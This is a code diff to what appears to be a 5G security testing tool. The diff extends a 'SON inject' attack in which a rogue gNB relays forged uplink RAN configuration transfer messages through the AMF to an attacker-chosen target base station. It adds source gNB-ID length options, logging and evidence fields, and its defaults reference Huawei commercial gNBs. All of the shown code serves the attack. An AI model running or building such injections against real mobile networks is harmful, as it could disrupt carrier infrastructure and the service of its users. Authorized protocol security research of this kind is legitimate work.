@@ -428,13 +428,18 @@ def cmd_ran_config_update(gnb, a):
 def cmd_ul_ran_config_transfer(gnb, a):
     """g09: blind-relay SON/Xn config toward an attacker-named target gNB."""
     tgt_len = int(getattr(a, "target_gnb_id_len", 22))
+    src_len = int(getattr(a, "source_gnb_id_len", 22))
     gnb.send(B.uplink_ran_configuration_transfer(
         gnb.cfg, target_gnb_id=a.target_gnb_id, source_gnb_id=a.source_gnb_id,
-        target_gnb_id_len=tgt_len), wait=False)
+        target_gnb_id_len=tgt_len, source_gnb_id_len=src_len), wait=False)
+    src = a.source_gnb_id if a.source_gnb_id is not None else gnb.cfg.get("gnb_id")
     print(f"[ul-ran-config-transfer] SON inject relayed via AMF -> "
+          f"source gNB-id={int(src):#x}/{src_len}bit "
           f"target gNB-id={a.target_gnb_id:#x}/{tgt_len}bit "
           f"(blind relay; observe DownlinkRANConfigurationTransfer at the target)")
     _save(a.evidence, {"attack": "son-inject",
+                       "source_gnb_id": src,
+                       "source_gnb_id_len": src_len,
                        "target_gnb_id": a.target_gnb_id,
                        "target_gnb_id_len": tgt_len})
 
@@ -960,6 +965,9 @@ def main():
                    help="target gNB-ID bit length (default 22 for Huawei "
                         "commercial gNB; UERANSIM gNB 1 needs 32)")
     s.add_argument("--source-gnb-id", type=lambda x: int(x, 0), default=None)
+    s.add_argument("--source-gnb-id-len", type=int, default=22,
+                   help="sourceRANNodeID gNB-ID bit length (default 22; "
+                        "does not change rogue NG Setup, still 32-bit 4660)")
 
     s = sub.add_parser("sweep")
     s.add_argument("--attack", required=True,
